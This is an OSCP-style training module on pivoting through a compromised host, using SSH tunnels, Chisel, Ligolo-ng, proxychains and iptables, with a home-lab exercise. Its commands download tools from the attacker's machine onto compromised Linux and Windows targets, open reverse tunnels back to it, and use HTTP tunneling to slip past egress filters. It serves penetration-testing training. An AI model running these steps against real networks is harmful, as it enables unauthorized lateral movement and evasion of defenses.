# 12 — Pivoting and Tunneling

Pivoting is using a compromised machine to reach networks you can't access directly. On the OSCP exam, the AD set often requires pivoting — you compromise Machine 1 in the DMZ and need to reach Machines 2 and 3 on an internal network. This module covers every pivoting technique you need.

---

## When You Need to Pivot

```
Your Kali (192.168.X.X)
    │
    │ Can reach the DMZ
    ↓
Machine 1 (DMZ — 192.168.X.20)
    │
    │ Has two interfaces — also on internal network
    ↓
Machine 2 (Internal — 10.10.10.20)    ← Kali CAN'T reach this
Machine 3 (Internal — 10.10.10.30)    ← Kali CAN'T reach this
```

You need Machine 1 to carry your traffic into the internal network.

---

## SSH Tunnels

SSH is almost always available and is the go-to pivoting tool. No additional software to upload.

### Local port forward — reach one specific service

**"I want to access an internal service from my Kali machine."**

```bash
ssh -L LOCAL_PORT:INTERNAL_TARGET:TARGET_PORT user@PIVOT_HOST
```

**Example:** Machine 1 can reach Machine 2's web server (10.10.10.20:80). You want to browse it from Kali.

```bash
ssh -L 8080:10.10.10.20:80 user@192.168.X.20
```

Now on Kali: `curl http://localhost:8080` hits Machine 2's web server.

**How it works:**

```
Kali localhost:8080
    │
    │ encrypted SSH tunnel
    ↓
Machine 1 (192.168.X.20)
    │
    │ plain TCP connection on internal network
    ↓
Machine 2 (10.10.10.20:80)
```

Kali thinks it's connecting to localhost:8080. SSH transparently forwards everything through the tunnel to Machine 2.

**Multiple ports at once:**

```bash
ssh -L 2222:10.10.10.20:22 -L 8080:10.10.10.20:80 -L 5985:10.10.10.20:5985 user@192.168.X.20
```

Now:
```
localhost:2222 → Machine 2's SSH
localhost:8080 → Machine 2's web server
localhost:5985 → Machine 2's WinRM
```

**Background tunnel (no interactive shell):**

```bash
ssh -fN -L 8080:10.10.10.20:80 user@192.168.X.20
```

`-f` backgrounds after connecting. `-N` means no shell (just the tunnel). The tunnel runs silently. Kill it later with:

```bash
ps aux | grep ssh
kill PID
```

### Dynamic port forward — SOCKS proxy for broad access

**"I want to reach ANYTHING on the internal network, not just one port."**

```bash
ssh -D 9050 user@192.168.X.20
```

This creates a SOCKS5 proxy on Kali port 9050. ANY tool routed through this proxy exits from Machine 1 onto the internal network.

**Configure proxychains:**

```bash
sudo nano /etc/proxychains4.conf
```

Change the last line to:
```
socks5 127.0.0.1 9050
```

**Use it:**

```bash
# Scan the internal network
proxychains nmap -sT -Pn 10.10.10.0/24 -p 22,80,445,3389,5985

# Connect to internal services
proxychains curl http://10.10.10.20
proxychains evil-winrm -i 10.10.10.20 -u admin -p password
proxychains smbclient -L //10.10.10.20 -N
proxychains ssh user@10.10.10.20
```

**Important:** Use `-sT` (TCP connect scan) with nmap through proxychains. SYN scans (`-sS`) use raw sockets which don't work through SOCKS. Always add `-Pn` (skip ping) because ICMP doesn't work through SOCKS either.

**Background SOCKS proxy:**

```bash
ssh -fN -D 9050 user@192.168.X.20
```

### SSH jump — chain through multiple hosts

**"I want to SSH to Machine 2 through Machine 1 in one command."**

```bash
ssh -J user@192.168.X.20 user@10.10.10.20
```

`-J` tells SSH: "connect to 192.168.X.20 first, then from there connect to 10.10.10.20."

**SOCKS proxy with a jump (reach the internal network through two hops):**

```bash
ssh -D 9050 -J user@192.168.X.20 user@10.10.10.20
```

Now your SOCKS proxy exits from Machine 2 — you can reach anything Machine 2 can see.

**Multiple jumps:**

```bash
ssh -J user@hop1,user@hop2 user@final_target
```

### Reverse tunnel — target connects back to you

**"The target can't receive inbound connections, but it can connect outbound to me."**

```bash
# On Kali — make sure SSH is running
sudo systemctl start ssh

# On the compromised host — create a reverse SOCKS proxy
ssh -R 9050 kali_user@KALI_IP
```

Now on Kali, port 9050 is a SOCKS proxy. Traffic goes through the tunnel, exits on the compromised host.

**Reverse port forward (one specific service):**

```bash
# On compromised host — expose internal MySQL to Kali
ssh -R 3306:10.10.10.20:3306 kali_user@KALI_IP
```

Now on Kali: `mysql -h 127.0.0.1 -P 3306` reaches Machine 2's MySQL through the reverse tunnel.

### When SSH tunnels get blocked

Egress firewalls block outbound SSH (port 22). Your reverse tunnel fails. Options:

```bash
# Try SSH on a different port (if your Kali SSH listens on 443)
ssh -R 9050 -p 443 kali_user@KALI_IP

# Use Chisel instead (tunnels over HTTP)
# Use Ligolo-ng (also over HTTP/HTTPS)
```

### SSH config file for complex setups

Instead of typing long commands, use `~/.ssh/config`:

```
Host pivot
    HostName 192.168.X.20
    User user
    
Host internal-web
    HostName 10.10.10.20
    User admin
    ProxyJump pivot

Host internal-dc
    HostName 10.10.10.30
    User administrator
    ProxyJump pivot
```

Now: `ssh internal-web` automatically jumps through the pivot. `scp file.txt internal-web:/tmp/` works too.

---

## Chisel — When SSH Is Blocked

Chisel tunnels over HTTP. Firewalls almost never block HTTP (port 80/443). It's a single binary with no dependencies — upload it and run.

### Install on Kali

```bash
sudo apt install chisel -y
# Or download from GitHub releases
```

### Reverse SOCKS proxy (the most common use)

```bash
# On Kali — start the server
chisel server --reverse --port 8080

# On compromised host — connect back and create SOCKS proxy
./chisel client KALI_IP:8080 R:socks
```

This creates a SOCKS5 proxy on **Kali port 1080**. Configure proxychains:

```bash
# /etc/proxychains4.conf — last line:
socks5 127.0.0.1 1080
```

Now: `proxychains nmap -sT -Pn 10.10.10.0/24`

### Reverse port forward

```bash
# On Kali
chisel server --reverse --port 8080

# On compromised host — forward internal SSH to Kali
./chisel client KALI_IP:8080 R:2222:10.10.10.20:22
```

Now: `ssh user@localhost -p 2222` reaches Machine 2's SSH through Chisel.

### Multiple tunnels in one connection

```bash
./chisel client KALI_IP:8080 R:socks R:2222:10.10.10.20:22 R:8888:10.10.10.20:80
```

One Chisel connection handles: SOCKS proxy + SSH forward + HTTP forward.

### Forward mode (less common — when you can reach the pivot)

```bash
# On compromised host (server)
./chisel server --port 8080

# On Kali (client)
chisel client PIVOT_IP:8080 9050:socks
```

### Transferring Chisel to the target

```bash
# On Kali — serve it
cp $(which chisel) /tmp/chisel
cd /tmp && python3 -m http.server 80

# On Linux target
wget http://KALI_IP/chisel
chmod +x chisel

# On Windows target
certutil -urlcache -f http://KALI_IP/chisel.exe chisel.exe
# or
Invoke-WebRequest http://KALI_IP/chisel.exe -OutFile chisel.exe
```

### Why Chisel over SSH

| | SSH tunnel | Chisel |
|---|---|---|
| Protocol | SSH (TCP 22) | HTTP (any port) |
| Blocked by egress filter? | Often (port 22 blocked) | Rarely (HTTP usually allowed) |
| Requires SSH creds | Yes | No — just command execution |
| Install needed | No (SSH is everywhere) | Yes — upload the binary |
| Best for | When SSH access exists | When SSH is blocked |

---

## Ligolo-ng — Modern Tunneling

Ligolo-ng creates a proper network interface (like a VPN). No proxychains needed — tools work natively.

### Setup

```bash
# On Kali — start the proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:443

# On target — start the agent
./agent -connect KALI_IP:443 -ignore-cert
```

### Configure routing

```bash
# In Ligolo proxy interface
>> session        # select the session
>> ifconfig       # see target's interfaces — find the internal subnet

# On Kali — add route to internal network through the Ligolo interface
sudo ip route add 10.10.10.0/24 dev ligolo

# Now you can reach internal hosts DIRECTLY — no proxychains
nmap -sV 10.10.10.20
curl http://10.10.10.20
evil-winrm -i 10.10.10.20 -u admin -p pass
```

### Why Ligolo-ng is powerful

```
With proxychains (SSH/Chisel):     With Ligolo-ng:
proxychains nmap ...               nmap ...          (just works)
proxychains curl ...               curl ...          (just works)  
proxychains evil-winrm ...         evil-winrm ...    (just works)
Some tools don't work              Everything works
SOCKS overhead                     Native speed
```

No proxychains prefix, no SOCKS configuration, no "this tool doesn't support proxies." Everything just works as if you're on the internal network.

---

## proxychains Configuration

### The config file

```bash
sudo nano /etc/proxychains4.conf
```

**Key settings:**

```
# Choose one mode:
#strict_chain          # All proxies must work in order
#dynamic_chain         # Skip dead proxies
#random_chain          # Random proxy order

dynamic_chain          # Best for most situations

# Proxy list (at the bottom)
[ProxyList]
socks5 127.0.0.1 9050     # SSH dynamic forward
# or
socks5 127.0.0.1 1080     # Chisel
```

### Chaining multiple proxies (double pivot)

```
[ProxyList]
socks5 127.0.0.1 9050     # First tunnel (Kali → Machine 1)
socks5 127.0.0.1 9051     # Second tunnel (Machine 1 → Machine 2)
```

Traffic goes: Kali → tunnel 1 → Machine 1 → tunnel 2 → Machine 2 → internal target.

### What works and doesn't work through proxychains

| Works | Doesn't work |
|---|---|
| `nmap -sT -Pn` (TCP connect) | `nmap -sS` (SYN scan — raw sockets) |
| `curl` | `ping` (ICMP) |
| `evil-winrm` | `nmap -sU` (UDP) |
| `smbclient` | `traceroute` |
| `crackmapexec` | `nmap` without `-Pn` (host discovery uses ICMP) |
| `ssh` | Most UDP-based tools |
| `nc` (TCP) | `nc` (UDP) |
| `impacket-*` tools | Raw socket tools |

**Remember:** Always `proxychains nmap -sT -Pn` — never `-sS` through proxychains.

---

## iptables Pivoting (Network-Level Routing)

When you have root on the pivot and need full network-level routing (not just TCP through a proxy).

### Enable IP forwarding

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

### Port forwarding with DNAT

```bash
# Forward CentOS:2222 to Ubuntu:22
sudo iptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to-destination 10.10.10.20:22
sudo iptables -A FORWARD -p tcp -d 10.10.10.20 --dport 22 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
```

Now: `ssh user@PIVOT_IP -p 2222` reaches Machine 2.

### Full subnet routing

```bash
# On pivot — NAT everything going to the internal network
sudo iptables -t nat -A POSTROUTING -s 192.168.X.0/24 -o eth1 -j MASQUERADE
sudo iptables -A FORWARD -s 192.168.X.0/24 -d 10.10.10.0/24 -j ACCEPT
sudo iptables -A FORWARD -s 10.10.10.0/24 -d 192.168.X.0/24 -j ACCEPT

# On Kali — add a route
sudo ip route add 10.10.10.0/24 via PIVOT_IP
```

### When to use iptables vs SSH tunnels

| | iptables | SSH tunnel / Chisel |
|---|---|---|
| Needs root | Yes | No |
| Encrypted | No | Yes |
| Stealth | Low (visible rules) | Higher |
| Protocols | All (TCP, UDP, ICMP) | TCP only |
| Persistence | Survives across sessions | Dies when tunnel closes |
| Best for | Full network access with root | Quick pivoting without root |

---

## Pivoting Decision Tree

```
You compromised a host. Need to reach internal network.

Do you have SSH credentials on the pivot?
├── YES → Do you need broad access or one specific service?
│   ├── One service → ssh -L port:target:port user@pivot
│   └── Broad access → ssh -D 9050 user@pivot + proxychains
│
└── NO → Can the pivot reach your Kali outbound?
    ├── YES → Is outbound SSH blocked?
    │   ├── NO → ssh -R (reverse tunnel from pivot to Kali)
    │   └── YES → Chisel (tunnels over HTTP)
    │       chisel server --reverse --port 80 (Kali)
    │       chisel client KALI:80 R:socks (pivot)
    │
    └── NO (fully isolated) → Need a relay or different approach
        └── Upload Ligolo-ng agent, connect outbound
```

---

## Lab: Practice Every Pivoting Method

Use your existing VM setup:

```
Kali (192.168.244.129) → CentOS (192.168.244.131 + 172.16.0.1) → Ubuntu (172.16.0.2)
```

### SSH local forward

```bash
# From Kali — reach Ubuntu's SSH through CentOS
ssh -L 2222:172.16.0.2:22 user@192.168.244.131

# In another terminal
ssh developer@localhost -p 2222
```

### SSH dynamic forward

```bash
# From Kali
ssh -D 9050 user@192.168.244.131

# Configure proxychains: socks5 127.0.0.1 9050
proxychains nmap -sT -Pn 172.16.0.2 -p 22,80
proxychains ssh developer@172.16.0.2
```

### SSH jump

```bash
ssh -J user@192.168.244.131 developer@172.16.0.2
```

### Chisel

```bash
# Kali
chisel server --reverse --port 8888

# CentOS
./chisel client 192.168.244.129:8888 R:socks

# Kali — update proxychains to socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 172.16.0.2 -p 22,80
```

### iptables forwarding (on CentOS as root)

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to-destination 172.16.0.2:22
sudo iptables -A FORWARD -p tcp -d 172.16.0.2 --dport 22 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

# From Kali
ssh developer@192.168.244.131 -p 2222
# You're on Ubuntu
```

Practice all four methods until you can set each one up from memory.

---

## Exam Tips for Pivoting

1. **SSH is your first choice.** It's already on the machine, encrypted, and requires no uploads.

2. **If SSH is blocked outbound, use Chisel.** Have the Chisel binary ready in your tools directory before the exam.

3. **Always use `-sT -Pn` with nmap through proxychains.** SYN scans and ping don't work through SOCKS.

4. **Keep your tunnels organized.** Write down which port does what. When you have three tunnels running, it's easy to lose track.

5. **Test the tunnel before running tools.** A quick `proxychains nc -zvn TARGET 22` confirms the tunnel works before you spend 10 minutes on a slow nmap scan.

6. **Ligolo-ng is the best tool if you have time to set it up.** No proxychains needed, everything works natively. But SSH tunnels are faster to establish for quick work.

7. **On the AD set, you'll almost certainly need to pivot.** The DC is rarely directly accessible from your starting position.
